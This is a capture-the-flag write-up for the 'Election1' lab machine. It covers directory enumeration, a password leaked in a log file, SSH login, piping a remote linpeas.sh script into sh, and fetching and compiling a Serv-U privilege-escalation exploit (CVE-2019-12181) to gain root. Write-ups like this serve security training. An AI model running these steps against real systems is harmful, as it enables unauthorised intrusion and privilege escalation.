[<- home](/)

# Election1 --- PG Play

### Scan
First I conducted the general scan with `nmap`:
```
targ3t=$targ3t
nmap -sT $targ3t -oG general.scan
```
It revealed two open ports `22` for ssh and `80` for http. I started with enumerating SSH:
```
nmap -sT $targ3t --script=ssh* -p 22 -oG ssh.scan
```
SSH scan didn't return any indication of a vulnerability on the surface. I scanned http after:
```
dirsearch -u http://$targ3t:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
This returned an `/election` path on our http. When we navigate to it, it's a webpage about election and there's a candidate registered named **Love**. There is also an input for a voter's code to vote. 

I then ran another `dirsearch` against `/election` path to see what's there:
```
dirsearch -u http://$targ3t:80/election -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
While the scan was still running I checked the results. 

- `/election/media` has some image files in it, that are used in the website. 
- `/election/themes` also holds files used for website's frontend. 
- `/election/data` is empty.
- `/election/admin` is an admin panel page expecting an input of admin's number. As I found out it has limited attempts to fill in the code. 
- `/election/lib` has a `homeAPI.php` empty file in it.
- `/election/data` has internationalization and localization data for the website's interface.
- `/election/js` has a localization script for the website.

Instead of waiting for it to complete I decided it would be more practical to run another `dirsearch` scan against one path that has anything in it --- `/election/admin`:

```
dirsearch -u http://$targ3t:80/election/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
This again returned a lot of files related to website's functioning, like images and markup files, but it also returned a `/election/admin/logs` path, which holds a file `system.log` in it, let's check it out: 
```
curl http://$targ3t/election/admin/logs/system.log
```
It seems we have a user `love` with assigned password `P@$$w0rd@123`. Let's try to use it for SSH:
```
ssh love@$targ3t -p 22
```
And we're in! Let's find out where we are:
```
uname -a
```
Seems to be a Ubuntu Linux, let's use LinPEAS to try and escalate privileges:
```
cd $(mktemp -d)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh > linpeas.scan
```
When the scan is done, check what we can find in it:
```
cat linpeas.scan | grep CVE
```
One of the interesting CVEs I could find was a `Serv-U` FTP Server's vulnerability `CVE-2019-12181`. Let's find an exploit for it:
```
searchsploit --cve CVE-2019-12181
```
Let's focus on the c file it returned for linux and transfer it to our target system:
```
cp /usr/share/exploitdb/exploits/linux/local/47009.c 47009.c
python -m http.server
```
And on the target system type:
```
wget http://<Your IP Address>:<Py Server Port>/47009.c
```
It's downloaded in the temporary directory we're in. Let's compile it:
```
gcc 47009.c -o expl
./expl
```
This returns a root shell as `whoami` command returns `root`.Let's list everything in user `love`'s home directory:
```
ls /home/love
```
Let's see what's in the `local.txt`
```
cat /home/love/local.txt
```
There's our first flag. Now let's see what's in the `/root`:
```
ls /root
```
There's a `proof.txt` file. Let's see what's in it:
```
cat /root/proof.txt
```
There goes our second flag as we successfully pwned the machine!
